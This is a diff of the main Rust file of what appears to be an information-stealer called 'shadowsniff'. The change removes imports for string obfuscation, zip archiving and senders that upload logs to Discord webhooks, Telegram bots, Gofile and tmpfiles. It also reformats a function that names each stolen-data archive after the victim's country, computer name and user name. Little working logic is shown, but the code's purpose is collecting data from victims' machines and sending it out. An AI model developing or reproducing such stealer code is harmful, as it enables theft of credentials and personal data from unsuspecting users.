@@ -12,25 +12,17 @@ use alloc::sync::Arc;
 use alloc::vec::Vec;
 use collector::atomic::AtomicCollector;
 use collector::display::PrimitiveDisplayCollector;
-use core::ops::Deref;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
 use ipinfo::{init_ip_info, unwrapped_ip_info, IpInfo};
-use obfstr::obfstr;
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
-use sender::discord_webhook::DiscordWebhookSender;
-use sender::gofile::GofileUploader;
-use sender::telegram_bot::TelegramBotSender;
-use sender::tmpfiles::TmpFilesUploader;
-use sender::LogSenderExt;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
 use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
-use zip::ZipArchive;
 
 mod panic;
 
@@ -92,7 +84,11 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
 }
 
 fn generate_log_name() -> Arc<str> {
-    let PcInfo { computer_name, user_name, .. } = PcInfo::retrieve();
+    let PcInfo {
+        computer_name,
+        user_name,
+        ..
+    } = PcInfo::retrieve();
     let IpInfo { country, .. } = unwrapped_ip_info();
 
     format!("[{country}] {computer_name}-{user_name}.shadowsniff.zip").into()
